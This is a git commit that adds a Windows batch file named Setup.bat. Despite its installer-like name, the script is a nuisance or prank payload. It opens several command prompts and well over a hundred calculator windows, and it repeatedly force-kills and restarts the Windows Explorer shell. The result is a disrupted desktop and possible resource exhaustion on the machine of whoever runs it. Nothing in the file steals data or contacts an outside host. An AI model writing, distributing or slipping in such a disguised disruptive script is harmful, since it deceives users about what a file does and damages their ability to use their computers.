8a15a26ea5619ec49199af021ec3199d1dd25f8b
Invi <87852132+Invincible23411@users.noreply.github.com>
2022-11-25 12:36:18 +0800

    Add files via upload

---
+++ Setup.bat
@@ -0,0 +1,241 @@
+@echo off
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 2
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 2
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 2
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 2
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
